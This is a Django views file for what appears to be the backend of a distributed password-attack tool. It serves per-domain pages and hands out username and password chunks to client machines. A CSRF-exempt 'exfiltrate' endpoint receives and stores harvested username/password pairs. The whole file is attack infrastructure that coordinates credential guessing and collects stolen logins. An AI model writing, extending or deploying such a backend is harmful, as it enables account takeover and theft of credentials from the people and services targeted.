import json

from django.http import HttpResponse, JsonResponse
from django.template import loader
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt

from app.models import Credential, Domain, Client
from app.offset import OffsetUtils


def index(request, domain):
    find = Domain.objects.get(name=domain)
    template = loader.get_template('app/index.html')
    context = {
        'domain': find
    }
    return HttpResponse(template.render(context, request))


@csrf_exempt
def exfiltrate(request, domain):
    find = Domain.objects.get(name=domain)
    cred_json = json.loads(request.body)
    cred = Credential(username=cred_json['username'], password=cred_json['password'], domain=find)
    cred.save()
    return HttpResponse(status=204)


def usernames(request, domain):
    find = Domain.objects.get(name=domain)
    client = Client.objects.get(uuid=request.GET['uuid'])
    offset = OffsetUtils.next_username_offset(client, timezone.now())

    # TODO : race condition
    return JsonResponse({'usernames': list(offset.values())})


def passwords(request, domain):
    find = Domain.objects.get(name=domain)
    data = find.password_set.all()[0:find.password_offset + find.chunk_size]
    find.password_offset += find.chunk_size
    find.save()
    # TODO : race condition
    return JsonResponse({'passwords': list(data.values('password'))})
